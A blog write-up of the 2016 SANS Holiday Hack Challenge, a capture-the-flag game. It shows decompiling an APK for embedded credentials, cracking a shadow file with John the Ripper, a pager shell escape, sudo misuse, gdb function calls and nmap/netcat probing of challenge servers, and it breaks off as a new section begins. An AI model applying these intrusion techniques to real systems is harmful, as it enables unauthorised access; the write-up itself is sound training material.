---
layout:     post
title:      "2016 SANS Holiday Hack Challenge"
date:       2017-01-04 11:37:00
author:     "Nikolai Magnussen"
header-img: "img/SANS-2017.png"
---

# Part 1: A Most Curious Business Card
Right after we are thrown into the game, we are presented with Santa's business card, which is linking to his [twitter](https://twitter.com/santawclaus) and [instagram](https://www.instagram.com/santawclaus/):
![Business card]({{ site.url }}/assets{{ page.url }}santa_business_card.png){:class="img-responsive"}

## 1) What is the secret message in Santa's tweets?
Looking through Santa's [tweets](https://twitter.com/santawclaus), they seem to form some pattern, so let's extract them from the website.
Lacking an API key, I choose to do this in a hacky manner; by first scrolling to the bottom of Santa's twitter feed so all his tweets are loaded.

Then, I fired up the firefox Inspector and copied the inner HTML of the stream element containing all the tweets, and dumped the contents into a file for further processing.
The twitter dump contain large amounts of empty lines and other uninteresting information; in fact, the dumped file is 76K lines.
Luckily, the tweet text has it's own CSS-class, namely ```tweet-text```, which mean that we can filter away everything else.

	❯ grep "tweet-text" twitter.dump

This yield the following:
![Last letter]({{ site.url }}/assets{{ page.url }}some_tweets.png){:class="img-responsive"}
Which certanly looks like a Y, and is only the last letter, and between each tweet line is a div opening tag, which should be removed by:

	❯ grep "tweet-text" twitter.dump | sed -e "/<div.*>/d" > tweets.dump
	❯ less tweets.dump

Rotating the output yield the following:
![Tweets]({{ site.url }}/assets{{ page.url }}tweets.png){:class="img-responsive"}

And we can easily see that the secret message in Santa's tweets is:

**BUG BOUNTY**

## 2) What is inside the ZIP file distributed by Santa's team?
Let's take look at Santa's [instagram photos](https://www.instagram.com/santawclaus).
The first image is interesting, and after extracting the image URL, we can more easily look at it:
![Instagram]({{ site.url }}/assets{{ page.url }}santa_instagram.jpg){:class="img-responsive"}

On the computer screen, we can see ```DestinationPath SantaGram_v4.2.zip```, and a nmap of ```www.northpolewonderland.com```.
So let's try and combine the two by:

	❯ wget www.northpolewonderland.com/SantaGram_v4.2.zip
	--2017-01-04 16:22:38--  http://www.northpolewonderland.com/SantaGram_v4.2.zip
	Resolving www.northpolewonderland.com (www.northpolewonderland.com)... 130.211.124.143
	Connecting to www.northpolewonderland.com (www.northpolewonderland.com)|130.211.124.143|:80
	HTTP request sent, awaiting response... 200 OK
	Length: 1963026 (1.9M) [application/zip]
	Saving to: ‘SantaGram_v4.2.zip’

	2017-01-04 16:22:43 (468 KB/s) - ‘SantaGram_v4.2.zip’ saved [1963026/1963026]

Lo and behold, we got a file, so now we want to unzip it to see it's contents:

	❯ unzip SantaGram_v4.2.zip
	Archive:  SantaGram_v4.2.zip
	[SantaGram_v4.2.zip] SantaGram_4.2.apk password: 

Let's try to use the secret message from Santa as the password.
After a number of combinations, I try **bugbounty**, which yield the decompressed **SantaGram_4.2.apk**.

Thus, the answer to the question is the ZIP file contains an APK file named **SantaGram_4.2.apk**.


# Part 2: Awesome Package Konveyance
Now that we have the apk, we have to get the contents. This can be achieved in multiple ways, and one of which, I will show.
First, we need to know that apk files are actually very closely related to zip files, and can also be extracted like one:

	❯ file SantaGram_4.2.apk 
	SantaGram_4.2.apk: Zip archive data, at least v2.0 to extract
	❯ mv SantaGram_4.2.apk SantaGram_4.2.apk.zip
	❯ unzip SantaGram_4.2.apk.zip 
	Archive:  SantaGram_4.2.apk.zip
	  inflating: AndroidManifest.xml     
	  inflating: META-INF/CERT.RSA       
	.... Lines removed for brevity ....

Now we have the contents of the APK:

	❯ l
	total 1.7M
	drwxr-xr-x  5 nikolai nikolai 4.0K Jan  4 17:20 .
	drwx------ 66 nikolai nikolai 4.0K Jan  4 17:21 ..
	-rw-rw-rw-  1 nikolai nikolai 5.7K Dec 31  1979 AndroidManifest.xml
	drwxr-xr-x  2 nikolai nikolai 4.0K Jan  4 17:19 assets
	-rw-r--r--  1 nikolai nikolai 1.5M Dec 31  1979 classes.dex
	drwxr-xr-x  2 nikolai nikolai 4.0K Jan  4 17:19 META-INF
	drwxr-xr-x 30 nikolai nikolai 4.0K Jan  4 17:19 res
	-rw-rw-rw-  1 nikolai nikolai 223K Dec 31  1979 resources.arsc

The code and classes are contained in the classes.dex file, which can be extracted using [dex2jar](https://github.com/pxb1988/dex2jar) as such:

	❯ dex2jar classes.dex 
	dex2jar classes.dex -> ./classes-dex2jar.jar

And jar files, too are very closely related to zip files, and can be handled in the same manner:

	❯ file classes-dex2jar.jar 
	classes-dex2jar.jar: Zip archive data, at least v1.0 to extract
	❯ mv classes-dex2jar.jar classes-dex2jar.jar.zip
	❯ unzip classes-dex2jar.jar.zip
	Archive:  classes-dex2jar.jar.zip
	  inflating: a/a.class               
	  inflating: a/b$1.class             
	  inflating: a/b$a.class         
	.... Lines removed for brevity ....

These class files contain java bytecode and can be decompiled using a java decompiler, and I will be using [jad](http://www.javadecompilers.com/jad) recursively into a newly created directory:

	❯ jad -d classes_decompiled -s java -r **/*.class
	Parsing a/a.class...The class file version is 50.0 (only 45.3, 46.0 and 47.0 are supported)
	 Generating classes_decompiled/a/a.java
	Parsing a/b.class...The class file version is 50.0 (only 45.3, 46.0 and 47.0 are supported)
	Parsing inner class a/b$a.class...The class file version is 50.0 (only 45.3, 46.0 and 47.0 are supported)
	Parsing inner class a/b$1.class...The class file version is 50.0 (only 45.3, 46.0 and 47.0 are supported)
	 Generating classes_decompiled/a/b.java
	.... Lines removed for brevity ....

Now, the contents of the decompiled  java can be found in the directory classes_decompiled.

## 3) What username and password are embedded in the APK file?
Because the username and password are embedded in the APK file, we want a tool for searching through the java files for the password and the username. I choose to use [ripgrep](https://github.com/BurntSushi/ripgrep) which is a Rust tool written for very fast source code search, but grep can also be used:

	❯ rg password
	com/parse/ParseUser.java
	420:            throw new IllegalArgumentException("Must specify a password for the user to log in with");
	778:    public static void requestPasswordResetInBackground(String s, RequestPasswordResetCallback requestpasswordresetcallback)
	.... Lines removed for brevity ....
	com/northpolewonderland/santagram/SplashScreen.java
	85:            jsonobject.put("password", "busyreindeer78");

	com/northpolewonderland/santagram/b.java
	130:            jsonobject.put("password", "busyreindeer78");
	.... Lines removed for brevity ....

From which, we see that the password is **busyreindeer78**.

Extracting the username is done in the same manner:

	❯ rg username
	com/northpolewonderland/santagram/SplashScreen.java
	84:            jsonobject.put("username", "guest");

	com/northpolewonderland/santagram/b.java
	129:            jsonobject.put("username", "guest");
	.... Lines removed for brevity ....

And it seem that the username is **guest**.

Thus, the embedded username is **guest** and password is **busyreindeer78**.

## 4) What is the name of the audible component (audio file) in the SantaGram APK file?

Because the audio file is an audible component of the APK, it should be refered to by at least one file, so let's go back to the root directory of the APK and search known audio files; the most obvious being mp3:

	❯ rg mp3          
	META-INF/CERT.SF
	702:Name: res/raw/discombobulatedaudio1.mp3

	META-INF/MANIFEST.MF
	701:Name: res/raw/discombobulatedaudio1.mp3
	
Based on the question and the file names, this seem to be the corret file, meaning the name of the audible component is:

**discombobulatedaudio1.mp3**

# Part 3: A Fresh-Baked Holiday Pi
After going through the portal in Santa's sack, you end up on the north pole, where *Holly Evergreen* is waiting for you and tells you:
![Pi in pieces]({{ site.url }}/assets{{ page.url }}talk_pieces.png){:class="img-responsive"}

Then, we should start looking for the pieces; whatever they may be.
After you walk into town and talk to one of the elves you get to know that you are looking for pieces of a Cranberri Pi:
![Cranberry sleigh]({{ site.url }}/assets{{ page.url }}talk_sleigh_cranberry_pi.png){:class="img-responsive"}

And at the far west, and a little south, you find Elf House 1:

![House 1]({{ site.url }}/assets{{ page.url }}place_elf_house1.png){:class="img-responsive"}

And inside the Secret Fireplace Room you find part 1/5, namely the **Cranberry Pi Board**:

![Fireplace]({{ site.url }}/assets{{ page.url }}place_secret_fireplace_room.png){:class="img-responsive"}

The first house on the east side of the bridge into town is Elf House 2, and if you take the stairs up to the second floor, you will find the **Heatsink**, which is part 2/5:

![House 2 second floor]({{ site.url }}/assets{{ page.url }}place_elf_house2_upstairs.png){:class="img-responsive"}

Located just north of the christmas tree, behind the snowman you will find the **Power Cord**, which is part 3/5:

![Outside snowman]({{ site.url }}/assets{{ page.url }}place_outside_snowman.png){:class="img-responsive"}

Climbing up the ladders to the top, the workshop is discovered, and on the west side, you will see part 4/5, which is the **SD Card**:

![Outside workshop west]({{ site.url }}/assets{{ page.url }}place_outside_west_workshop.png){:class="img-responsive"}

Finally, walking into the workshop and down the stairs, you will find the final part, the **HDMI Cable**:

![Workshop]({{ site.url }}/assets{{ page.url }}place_workshop.png){:class="img-responsive"}

Now that all parts are located, we return to **Holly** for some information:

![Cranbian]({{ site.url }}/assets{{ page.url }}talk_cranbian.png){:class="img-responsive"}

After downloading the [image](https://northpolewonderland.com/cranbian.img.zip), we must unzip it:

	❯ unzip cranbian.img.zip 
	Archive:  cranbian.img.zip
	  inflating: cranbian-jessie.img    

## 5) What is the password for the "cranpi" account on the Cranberry Pi system?
Now that we have the image, we want to retrieve the password for the account "cranpi".

The **cranbian-jessie.img** is simply a dump of the disk, meaning it will contain a partition table and partitions that can be mounted. Lets use fdisk:

	❯ fdisk cranbian-jessie.img                                                                                                          ⏎

	Welcome to fdisk (util-linux 2.28.2).
	Changes will remain in memory only, until you decide to write them.
	Be careful before using the write command.


	Command (m for help): p
	Disk cranbian-jessie.img: 1.3 GiB, 1389363200 bytes, 2713600 sectors
	Units: sectors of 1 * 512 = 512 bytes
	Sector size (logical/physical): 512 bytes / 512 bytes
	I/O size (minimum/optimal): 512 bytes / 512 bytes
	Disklabel type: dos
	Disk identifier: 0x5a7089a1

	Device               Boot  Start     End Sectors  Size Id Type
	cranbian-jessie.img1        8192  137215  129024   63M  c W95 FAT32 (LBA)
	cranbian-jessie.img2      137216 2713599 2576384  1.2G 83 Linux

This mean that the second partition can be mounted and will contain the root file system.
For this, we use mount with the offset option, and the offset is calculated as **sector size * start sector**, which here will be:
	
	❯ python -c "print(512 * 137216)" 
	70254592

Meaning that we can mount using:

	❯ sudo mount -v -o offset=70254592 -t ext4 cranbian-jessie.img /mnt/device 
	mount: /dev/loop0 mounted on /mnt/device.
	❯ ls /mnt/device 
	bin  boot  dev  etc  home  lib  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var

And we have succesfully mounted the partition.
Now, we just have to crack the password. As most if not all modern linux kernels, two files are used for user authentication; 
- ```/etc/passwd``` which contain information such as username, uid, gid, home directory
- ```/etc/shadow which``` among other things contain the username along with hashed passwords.

But the password is hashed, and we have to crack the password, where [John The Ripper](http://www.openwall.com/john/) can be of assistance, as well as the [RockYou](https://wiki.skullsecurity.org/index.php?title=Passwords) wordlist. So we have to get the **RockYou** wordlist:

	❯ wget https://downloads.skullsecurity.org/passwords/rockyou.txt.bz2
	--2017-01-04 21:45:18--  https://downloads.skullsecurity.org/passwords/rockyou.txt.bz2
	Connecting to downloads.skullsecurity.org (downloads.skullsecurity.org)|192.155.81.86|:443
	HTTP request sent, awaiting response... 200 OK
	Length: 60498886 (58M) [application/octet-stream]
	Saving to: ‘rockyou.txt.bz2’

	2017-01-04 21:53:03 (128 KB/s) - ‘rockyou.txt.bz2’ saved [60498886/60498886]
	❯ bunzip2 rockyou.txt.bz2 

	
But before we run ```john```, we have to combine ```/etc/passwd``` and ```/etc/shadow``` by using ```unshadow```, which is a part of the **John the ripper** toolkit:


	❯ sudo unshadow /mnt/device/etc/passwd /mnt/device/etc/shadow > unshadowed.db
	❯ john --wordlist=rockyou.txt unshadowed.db 
	Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 64/64 OpenSSL])
	Will run 8 OpenMP threads
	Press 'q' or Ctrl-C to abort, almost any other key for status
	yummycookies     (cranpi)
	1g 0:00:04:32 DONE (2017-01-04 22:02) 0.003672g/s 1668p/s 1668c/s 1668C/s yves69..yoyojojo

The password for the cranpi account on the Cranberry Pi is **yummycookies**.

## 6) How did you open each terminal door and where had the villain imprisoned Santa?

After cracking the password, we have to tell the password to **Holly** that tells us that we can now access the terminals around the town:

![Terminals]({{ site.url }}/assets{{ page.url }}talk_terminal_access.png){:class="img-responsive"}

First, we go to Elf House 2:

![House 2]({{ site.url }}/assets{{ page.url }}place_elf_house2.png){:class="img-responsive"}

And accessing the terminal promt us with:

	*******************************************************************************
	*                                                                             *
	*To open the door, find both parts of the passphrase inside the /out.pcap file* 
	*                                                                             *
	*******************************************************************************

Upon inspection of the root directory we get:

	scratchy@7359d0309dd1:/$ ls -lah
	total 1.2M
	drwxr-xr-x  46 root  root  4.0K Jan  4 21:22 .
	drwxr-xr-x  46 root  root  4.0K Jan  4 21:22 ..
	-rwxr-xr-x   1 root  root     0 Jan  4 21:22 .dockerenv
	drwxr-xr-x   2 root  root  4.0K Dec  1 21:18 bin
	drwxr-xr-x   2 root  root  4.0K Sep 12 04:09 boot
	drwxr-xr-x   5 root  root   380 Jan  4 21:22 dev
	drwxr-xr-x  46 root  root  4.0K Jan  4 21:22 etc
	drwxr-xr-x   5 root  root  4.0K Dec  7 20:22 home
	drwxr-xr-x  10 root  root  4.0K Dec  1 21:18 lib
	drwxr-xr-x   2 root  root  4.0K Nov  4 18:29 lib64
	drwxr-xr-x   2 root  root  4.0K Nov  4 18:28 media
	drwxr-xr-x   2 root  root  4.0K Nov  4 18:28 mnt
	drwxr-xr-x   2 root  root  4.0K Nov  4 18:28 opt
	-r--------   1 itchy itchy 1.1M Dec  2 15:05 out.pcap
	dr-xr-xr-x 350 root  root     0 Jan  4 21:22 proc
	drwx------   2 root  root  4.0K Nov  4 18:28 root
	drwxr-xr-x   3 root  root  4.0K Nov  4 18:28 run
	drwxr-xr-x   2 root  root  4.0K Nov  4 18:30 sbin
	drwxr-xr-x   2 root  root  4.0K Nov  4 18:28 srv
	dr-xr-xr-x  13 root  root     0 Dec 14 14:13 sys
	drwxrwxrwt   2 root  root  4.0K Dec  7 20:22 tmp
	drwxr-xr-x  15 root  root  4.0K Dec  1 21:18 usr
	drwxr-xr-x  17 root  root  4.0K Dec  2 15:13 var

Which mean that only root or itchy can read the **out.pcap** file.
Let's see if we can use sudo:

	scratchy@7359d0309dd1:/$ sudo -l
	sudo: unable to resolve host 7359d0309dd1
	Matching Defaults entries for scratchy on 7359d0309dd1:
	    env_reset, mail_badpass,
	    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

	User scratchy may run the following commands on 7359d0309dd1:
	    (itchy) NOPASSWD: /usr/sbin/tcpdump
	    (itchy) NOPASSWD: /usr/bin/strings

Which mean that we can use both tcpdump and strings as itchy without a password.
Let's first try to use strings:

	scratchy@7359d0309dd1:/$ sudo -u itchy strings out.pcap | more
	sudo: unable to resolve host 7359d0309dd1
	ZAX<
	ZAX}
	ZAX,
	BGET /firsthalf.html HTTP/1.1
	User-Agent: Wget/1.17.1 (darwin15.2.0)
	Accept: */*
	Accept-Encoding: identity
	Host: 192.168.188.130
	Connection: Keep-Alive
	ZAX2
	4hf@
	Ehg@
	OHTTP/1.0 200 OK
	.... Lines removed for brevity ....
	<head></head>
	<body>
	<form>
	<input type="hidden" name="part1" value="santasli" />
	</form>
	</body>
	</html>
	4hm@
	ZAXW
	@2/@
	DGET /secondhalf.bin HTTP/1.1
	User-Agent: Wget/1.17.1 (darwin15.2.0)
	Accept: */*
	Accept-Encoding: identity
	Host: 192.168.188.130
	Connection: Keep-Alive
	.... Lines removed for brevity ....

Which mean that the password is divided into two parts, one that is contained in the hidden field of the **firsthalf.html** document and has the value **santasli**.

Further, we see that the second part is a binary file, which can't be extracted using strings, and we have to use ```tcpdump```.
But because I am not very comfortable with tcpdump and prefer wireshark, I will extract the data from the system using ```base64```:

	scratchy@6b813b8d621f:/$ sudo -u itchy tcpdump -r /out.pcap -w /tmp/out.pcap
	scratchy@6b813b8d621f:/$ base64 < /tmp/out.pcap
	uXglCtLvSmxqv+NCJzAfwV+kpJvaVgEEBpoN7ObDn8y+taO2xSArMx0qSKhwZUJ5nqa3aN9deG0C
	Gsv5Zyov5FvP7OLMPWtpHWxe1oAz/jrblGKWa4Blp8e5BZgUX/cca3qAW0VWPjg07CR5vN53EMJc
	.... Lines removed for brevity ....

Using Chromium's Developer Tools, each line that will be printed to the terminal will also be logged to the console, where it can be saved. After the file is saved, the data must be extracted:

	❯ base64 -d -i < out.pcap.base64 > out.pcap

Upon viewing this in Wireshark, missing packets are reported.
When following the TCP stream, saving it to a file and removing the response header, binwalk discover nothing, as well as the content length being much greater than the size of the actual data.

I then resorted to guessing that the password would be **santaslittlehelper**, which was correct.

Next up is the terminal leading to the second floor of the **Workshop**:

![Workshop 2]({{ site.url }}/assets{{ page.url }}place_workshop2.png){:class="img-responsive"}

Accessing the terminal prompt us with:

	*******************************************************************************
	*                                                                             *
	* To open the door, find the passphrase file deep in the directories.         * 
	*                                                                             *
	*******************************************************************************

Let's first try to find something that contain either *pass*, *secret* or a *.txt-file*:

	elf@e00c10ed7762:~$ find . -iname "*pass*"
	elf@e00c10ed7762:~$ find . -iname "*secret*"
	./.doormat/. / /\/\\/Don't Look Here!/secret
	elf@e00c10ed7762:~$ find . -iname "*.txt"
	./.doormat/. / /\/\\/Don't Look Here!/You are persistent, aren't you?/'/key_for_the_door.txt

My best hunch is that **key_for_the_door.txt** is the winner, so let's try to get it's content:

	elf@b2faeb120ffa:~$ cat .doormat/.\ /\ /\\/\\\\/Don\'t\ Look\ Here\!/You\ are\ persistent,\ aren\'t\ you?/\'/key_for_the_door.txt
	 key: open_sesame

And the passphrase is **open_sesame**.

Next up is the terminal inside Santa's office:

![Santa office]({{ site.url }}/assets{{ page.url }}place_santa_office.png

Accesing the terminaly, you are met with the line **GREETINGS PROFESSOR FALKEN**, wheras you shoud reply according to the movie [WarGames](http://www.imdb.com/title/tt0086567/) which is highly recomended to watch if you have not done so yet, and if you have, you should rewatch it!
If we finish the conversation, we get the key:

	GREETINGS PROFESSOR FALKEN.

	Hello.

	HOW ARE YOU FEELING TODAY?

	I'm fine. How are you?

	EXCELLENT, IT'S BEEN A LONG TIME. CAN YOU EXPLAIN THE REMOVAL OF YOUR USER ACCOUNT ON 6/
	23/73?

	People sometimes make mistakes.

	YES THEY DO. SHALL WE PLAY A GAME?

	Love to. How about Global Thermonuclear War?

	WOULDN'T YOU PREFER A GOOD GAME OF CHESS?

	Later. Let's play Global Thermonuclear War.

	FINE

	,------~~v,_         _                     _--^\
	|'          \   ,__/ ||                 _/    /,_ _
	/             \,/     /         ,,  _,,/^         v v-___
	|                    /          |'~^                     \
	\                   |         _/                     _ _/^
	 \                 /         /                   ,~~^/ |
	  ^~~_       _ _   /          |          __,, _v__\   \/
	      '~~,  , ~ \ \           ^~       /    ~   //
		  \/     \/             \~,  ,/          
		        	            ~~
          UNITED STATES                   SOVIET UNION
	WHICH SIDE DO YOU WANT?
	    1.    UNITED STATES
	    2.    SOVIET UNION

	PLEASE CHOOSE ONE:
	2

	AWAITING FIRST STRIKE COMMAND
	-----------------------------
	PLEASE LIST PRIMARY TARGETS BY
	CITY AND/OR COUNTRY NAME:

	Las Vegas

	LAUNCH INITIATED, HERE'S THE KEY FOR YOUR TROUBLE:
	LOOK AT THE PRETTY LIGHTS
	Press Enter To Continue

Which gives us the key **LOOK AT THE PRETTY LIGHTS**.

Now, we head to the door to the right of the reindeers:

![Workshop]({{ site.url }}/assets{{ page.url }}place_workshop.png){:class="img-responsive"}

Where we are greeted with:

	*******************************************************************************
	*                                                                             *
	* Find the passphrase from the wumpus.  Play fair or cheat; it's up to you.   * 
	*                                                                             *
	*******************************************************************************

We decide to cheat, and the easy way is to simply extract the binary to the host machine by using base64:

	elf@0cd3bf69f734:~$ base64 < wumpus 
	f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAMAxAAAAAAABAAAAAAAAAAKBkAAAAAAAAAAAAAEAAOAAJ
	AEAAHgAbAAYAAAAFAAAAQAAAAAAAAABAAEAAAAAAAEAAQAAAAAAA+AEAAAAAAAD4AQAAAAAAAAgA
	.... Lines removed for brevity ....

After the binary is extracted to the host machine, we can run it using GDB:

	❯ gdb wumpus
	GNU gdb (GDB) 7.12
	Copyright (C) 2016 Free Software Foundation, Inc.
	License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
	This is free software: you are free to change and redistribute it.
	There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
	and "show warranty" for details.
	This GDB was configured as "x86_64-pc-linux-gnu".
	Type "show configuration" for configuration details.
	For bug reporting instructions, please see:
	<http://www.gnu.org/software/gdb/bugs/>.
	Find the GDB manual and other documentation resources online at:
	<http://www.gnu.org/software/gdb/documentation/>.
	For help, type "help".
	Type "apropos word" to search for commands related to "word"...
	Reading symbols from wumpus...(no debugging symbols found)...done.
	gdb-peda$

And by using GDB's autocomplete feature for function names that we can call, we see that there exist two functions that deal with wump, namely ```kill_wump``` and ```wump_kill```, where one is the player being killed, and the other wumpus being killed.

	gdb-peda$ call 
	Display all 132 possibilities? (y or n)
	.... Lines removed for brevity ....
	initialize_things_in_cave      shoot
	instructions                   shoot_self
	int_compare                    srandom
	isatty                         srandom@plt
	isatty@plt                     stderr
	jump                           stderr@@GLIBC_2.2.5
	kill_wump                      stdin
	lastchance                     stdin@@GLIBC_2.2.5
	level                          stdout
	malloc@plt                     wump_kill
	move_to                        wump_nearby
	move_wump                      wumpus_loc
	.... Lines removed for brevity ....
	gdb-peda$ start
	Temporary breakpoint 1, 0x0000000000400d2a in main ()
	gdb-peda$ call kill_wump()
	*thwock!* *groan* *crash*

	A horrible roar fills the cave, and you realize, with a smile, that you
	have slain the evil Wumpus and won the game!  You don't want to tarry for
	long, however, because not only is the Wumpus famous, but the stench of
	dead Wumpus is also quite well known, a stench plenty enough to slay the
	mightiest adventurer at a single whiff!!

	Passphrase:
	WUMPUS IS MISUNDERSTOOD
	$2 = 0x18

And we can see that the passphrase is **WUMPUS IS MISUNDERSTOOD**.

Lastly, we have the train station:

![Train]({{ site.url }}/assets{{ page.url }}place_train.png){:class="img-responsive"}

Activating the train terminal, we are greeted with a **Train Managment Console**:

	Train Management Console: AUTHORIZED USERS ONLY
	                ==== MAIN MENU ====
	STATUS:                         Train Status
	BRAKEON:                        Set Brakes
	BRAKEOFF:                       Release Brakes
	START:                          Start Train
	HELP:                           Open the help document
	QUIT:                           Exit console
	menu:main> 

If we drop into help, we get the help served in less, which mean that we can run commands from it the same way as with vim; by starting with ```:!```:

	:!ls
	ActivateTrain  TrainHelper.txt  Train_Console
	!done  (press RETURN)
	:!./ActivateTrain
	Press Enter to initiate time travel sequence.

The train is a time-machine!, and we are traveling back to 1978, where **Holly** also stood:

![1978 start]({{ site.url }}/assets{{ page.url }}place_1978_start.png){:class="img-responsive"}

After searching around the town, you finally discover Santa in his **Dungeon For Errant Reindeer (DFER)** in his Workshop:

![1978 santa]({{ site.url }}/assets{{ page.url }}quest_complete_santa.png){:class="img-responsive"}

The passwords to the terminals are:
- Elf House 2: **santaslittlehelper**
- To Santa's office: **open_sesame**
- Bookshelf in Santa's office: **LOOK AT THE PRETTY LIGHTS**
- Stables: **WUMPUS IS MISUNDERSTOOD**

# Part 4: My Gosh... It's Full of Holes
By uploading the APK to [Fallible](https://android.fallible.co), we get a few API's:

![APIs]({{ site.url }}/assets{{ page.url }}fallible_api.png){:class="img-responsive"}

Which boil down to the following servers:
- analytics.northpolewonderland.com
- ads.northpolewonderland.com
- dev.northpolewonderland.com
- dungeon.northpolewonderland.com
- ex.northpolewonderland.com

Which can be resolved by:

	❯ drill analytics.northpolewonderland.com
	;; ANSWER SECTION:
	analytics.northpolewonderland.com.	1800	IN	A	104.198.252.157
	❯ drill ads.northpolewonderland.com
	;; ANSWER SECTION:
	ads.northpolewonderland.com.	1800	IN	A	104.198.221.240
	❯ drill dev.northpolewonderland.com
	;; ANSWER SECTION:
	dev.northpolewonderland.com.	1799	IN	A	35.184.63.245
	❯ drill dungeon.northpolewonderland.com
	;; ANSWER SECTION:
	dungeon.northpolewonderland.com.	1800	IN	A	35.184.47.139
	❯ drill ex.northpolewonderland.com
	;; ANSWER SECTION:
	ex.northpolewonderland.com.	1800	IN	A	104.154.196.33

When asking [Tom Hessman](https://twitter.com/tkh16) about these IP's, we get the green light for all of them:

![Hessman]({{ site.url }}/assets{{ page.url }}talk_hessman.png){:class="img-responsive"}

## 7) Which vulnerabilities did you discover and exploit?

### Dungeon
Talking to **Pepper Minstix**, we get a copy of the game [Dungeon](https://en.wikipedia.org/wiki/Zork#Zork_and_Dungeon), located [here](http://northpolewonderland.com/dungeon.zip)

![Dungeon]({{ site.url }}/assets{{ page.url }}talk_dungeon.png){:class="img_response"}

First, we have to get it and unzip it:

	❯ wget northpolewonderland.com/dungeon.zip
	--2017-01-05 03:35:22--  http://northpolewonderland.com/dungeon.zip
	Resolving northpolewonderland.com (northpolewonderland.com)... 130.211.124.143
	Connecting to northpolewonderland.com (northpolewonderland.com)|130.211.124.143|:80
	HTTP request sent, awaiting response... 200 OK
	Length: 179226 (175K) [application/zip]
	Saving to: ‘dungeon.zip’
	2017-01-05 03:35:24 (143 KB/s) - ‘dungeon.zip’ saved [179226/179226]
	❯ unzip dungeon 
	Archive:  dungeon.zip
	   creating: dungeon/
	  inflating: dungeon/dtextc.dat      
	  inflating: dungeon/dungeon

Dungeon has a built-in debugger, which is accessed from within the game using the **GDT** command, as referenced [here](http://gunkies.org/wiki/Zork#The_GDT_command):

	❯ ./dungeon
	chroot: No such file or directory
	Welcome to Dungeon.			This version created 11-MAR-78.
	You are in an open field west of a big white house with a boarded
	front door.
	There is a small wrapped mailbox here.
	>GDT
	GDT>help
	Valid commands are:
	AA- Alter ADVS          DR- Display ROOMS
	AC- Alter CEVENT        DS- Display state
	AF- Alter FINDEX        DT- Display text
	AH- Alter HERE          DV- Display VILLS
	AN- Alter switches      DX- Display EXITS
	AO- Alter OBJCTS        DZ- Display PUZZLE
	AR- Alter ROOMS         D2- Display ROOM2
	AV- Alter VILLS         EX- Exit
	AX- Alter EXITS         HE- Type this message
	AZ- Alter PUZZLE        NC- No cyclops
	DA- Display ADVS        ND- No deaths
	DC- Display CEVENT      NR- No robber
	DF- Display FINDEX      NT- No troll
	DH- Display HACKS       PD- Program detail
	DL- Display lengths     RC- Restore cyclops
	DM- Display RTEXT       RD- Restore deaths
	DN- Display switches    RR- Restore robber
	DO- Display OBJCTS      RT- Restore troll
	DP- Display parser      TK- Take

Because I do not know where I should end up, I want to enumerate all the rooms, and we can see that it is possible to change many things, including the room. The rooms are numbered in an ordered fashion starting from 0 and going up.
We can activate **GDT** to pick a room, then leave **GDT** and look, which repeats, but with a changing room number:

	❯ cat crawl.py
	#!/usr/bin/python
	for i in range(1000):
	    print("gdt")
	    print("ah")
	    print(i)
	    print("ex")
	    print("l")
	❯ ./crawl.py | ./dungeon
	Welcome to Dungeon.			This version created 11-MAR-78.
	You are in an open field west of a big white house with a boarded
	front door.
	There is a small wrapped mailbox here.
	>GDT>Old=      2      New= GDT>>It is pitch dark.  You are likely to be eaten by a grue.
	>GDT>Old=      0      New= GDT>>It is pitch dark.  You are likely to be eaten by a grue.
	>GDT>Old=      1      New= GDT>>You are in an open field west of a big white house with a boarded
	front door.
	There is a small wrapped mailbox here.
	.... Lines removed for brevity ....

Searching through this output, we find:

	>GDT>Old=    191      New= GDT>>You have mysteriously reached the North Pole. 
	In the distance you detect the busy sounds of Santa's elves in full 
	production. 

	You are in a warm room, lit by both the fireplace but also the glow of 
	centuries old trophies.
	On the wall is a sign: 
	        Songs of the seasons are in many parts 
	        To solve a puzzle is in our hearts
	        Ask not what what the answer be,
	        Without a trinket to satisfy me.
	The elf is facing you keeping his back warmed by the fire.

Which mean that we must give something to the elf, so we have to look more through the results of the enumeration, and among other items, we find:

	>GDT>Old=     79      New= GDT>>You are in a large room with a prominent doorway leading to a down
	staircase.  To the west is a narrow twisting tunnel.  Above you is a
	large dome painted with scenes depicting elvish hacking rites.  Up
	around the edge of the dome (20 feet up) is a wooden railing.  In the
	center of the room there is a white marble pedestal.
	Sitting on the pedestal is a flaming torch, made of ivory.

And if we try to give that torch to the elf, we get the following game:

	❯ ./dungeon
	Welcome to Dungeon.			This version created 11-MAR-78.
	You are in an open field west of a big white house with a boarded
	front door.
	There is a small wrapped mailbox here.
	>gdt
	GDT>ah
	Old=      2      New= 80
	GDT>ex
	>take torch
	Taken.
	>gdt
	GDT>ah
	Old=     80      New= 192
	GDT>ex
	>give elf torch
	The elf, satisified with the trade says - 
	Try the online version for the true prize
	The elf says - you have conquered this challenge - the game will now end.
	Your score is 14 [total of 585 points], in 2 moves.
	This gives you the rank of Beginner.
	The game is over.

We have the game server, but which port? Let's nmap it:

	❯ nmap -sC 35.184.47.139
	Starting Nmap 7.40 ( https://nmap.org ) at 2017-01-05 04:08 CET
	Nmap scan report for 139.47.184.35.bc.googleusercontent.com (35.184.47.139)
	Host is up (0.15s latency).
	Not shown: 995 closed ports
	PORT      STATE    SERVICE
	22/tcp    open     ssh
	| ssh-hostkey: 
	|   1024 c0:5a:84:94:cf:6f:b9:23:c8:23:32:66:2d:e2:e7:6e (DSA)
	|   2048 c4:cf:f2:c3:c5:63:26:bb:34:ab:b6:fe:a0:73:91:49 (RSA)
	|_  256 78:4a:3e:2f:24:d1:14:eb:6e:53:7d:5a:6c:0a:42:af (ECDSA)
	25/tcp    filtered smtp
	80/tcp    open     http
	|_http-title: About Dungeon
	11111/tcp open     vce
	13456/tcp filtered unknown

Let's try to connect to the server using netcat:

	❯ nc 35.184.47.139 11111     
	>give elf torch
	The elf, satisified with the trade says - 
	send email to "peppermint@northpolewonderland.com" for that which you seek.
	The elf says - you have conquered this challenge - the game will now end.

After sending an e-mail to **peppermint@northpolewonderland.com**, you receive a file named discombobulatedaudio3.mp3.

### Banner Ad Server

We figure out this site uses the [Meteor](https://www.meteor.com/) framework.
